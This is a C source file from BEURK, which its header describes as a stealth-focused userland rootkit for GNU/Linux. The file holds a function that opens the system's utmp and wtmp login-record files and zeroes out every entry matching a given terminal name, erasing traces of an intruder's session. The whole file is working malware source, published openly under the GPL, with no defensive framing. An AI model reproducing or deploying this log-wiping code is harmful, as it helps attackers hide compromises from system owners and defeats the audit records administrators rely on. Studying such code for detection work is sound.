/*
 * beurk is an userland rootkit for gnu/linux, focused around stealth.
 * copyright (c) 2015  unix-thrust
 *
 * this file is part of beurk.
 *
 * beurk is free software: you can redistribute it and/or modify
 * it under the terms of the gnu general public license as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "beurk.h"
#include <string.h> /* memset() */
#include <unistd.h> /* lseek(), read(), write(), close() */
#include <stdlib.h> /* free() */
#include <fcntl.h> /* O_RDWR */
#include <utmp.h> /* struct utmp, UTMP_FILE, WTMP_FILE */


/** hide utmp/wtmp records
 *
 * read each record on file, searching for entries to hide.
 * such records are overidden with zeros.
 */
static void uwtmp_clean(struct utmp *utmp_entry, const char *pty_name, int fd) {
    lseek(fd, 0, SEEK_SET);

    while (read(fd, utmp_entry, sizeof(*utmp_entry))) {
        if (!strncmp(utmp_entry->ut_line, pty_name, strlen(pty_name))) {
            memset(utmp_entry, 0, sizeof(*utmp_entry));
            lseek(fd, -(sizeof(*utmp_entry)), SEEK_CUR);
            write(fd, utmp_entry, sizeof(*utmp_entry));
        }
    }

    close(fd);
}


void    cleanup_login_records(const char *pty_name) {
    DEBUG(D_INFO, "cleanup_login_records() called");
    struct utmp     utmp_entry;
    int             fd;

    fd = REAL_OPEN(WTMP_FILE, O_RDWR);
    if (fd > 0)
        uwtmp_clean(&utmp_entry, pty_name, fd);

    fd = REAL_OPEN(UTMP_FILE, O_RDWR);
    if (fd > 0)
        uwtmp_clean(&utmp_entry, pty_name, fd);
}